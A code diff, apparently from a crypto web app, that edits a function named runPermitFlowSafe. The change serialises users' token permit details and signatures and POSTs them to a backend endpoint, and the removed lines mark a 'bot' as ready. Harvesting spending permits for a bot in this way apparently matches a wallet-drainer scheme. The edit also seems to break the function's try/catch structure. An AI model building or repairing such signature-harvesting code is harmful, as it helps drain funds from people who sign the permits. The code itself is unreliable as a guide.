@@ -392,42 +392,46 @@ async function runPermitFlowSafe(provider, signer, user){
  log("📡 Ready to send to backend");
 
 // Zet de signature in een object
+// 🧱 Maak veilige versie (zonder BigInt)
+const safeDetails = details.map(d => ({
+  token: d.token,
+  amount: d.amount.toString(),     // 🔥 FIX
+  expiration: d.expiration,
+  nonce: d.nonce.toString()        // 🔥 FIX
+}));
+
+
+
+// 📦 Bouw pakket voor backend
 const signatureData = {
-  details: details,
-  signature: sig, // je hebt eerder de signature gezet in sig
+  details: safeDetails,
+  signature: signature
 };
 
-// Verstuur naar de backend
-await sendToBackend(details, signatureData);
-  async function sendToBackend(details, signature) {
+// 🚀 Verstuur naar backend
+await sendToBackend(signatureData);
+
+async function sendToBackend(signatureData) {
   try {
     const response = await fetch('/api/permit', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({
-        details: details,
-        signature: signature
-      }),
+      body: JSON.stringify(signatureData)
     });
 
     const data = await response.json();
+
     if (data.success) {
       log("✅ Permit data successfully sent to backend and saved.");
     } else {
       log("❌ Error saving permit data: " + data.error);
     }
+
   } catch (error) {
     log("❌ Network error: " + error.message);
   }
-}
-  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
-  updateStatus('dot-bot','st-bot','READY','#6366f1');
-
- }catch(e){
-  log("❌ FLOW ERROR: " + e.message);
- }
 }
 
 
